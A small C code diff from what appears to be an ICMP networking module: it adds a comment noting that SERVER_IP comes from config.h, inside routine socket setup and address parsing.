@@ -65,7 +65,7 @@ static int icmp_init(void) {
     };
     setsockopt(current_sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
-    if(inet_pton(AF_INET, SERVER_IP, &server_addr) <= 0) {
+    if(inet_pton(AF_INET, SERVER_IP/*from config.h*/, &server_addr) <= 0) {
         printf("[-/ICMP] Error server_addr.\n");
         close(current_sockfd);
         return 1;
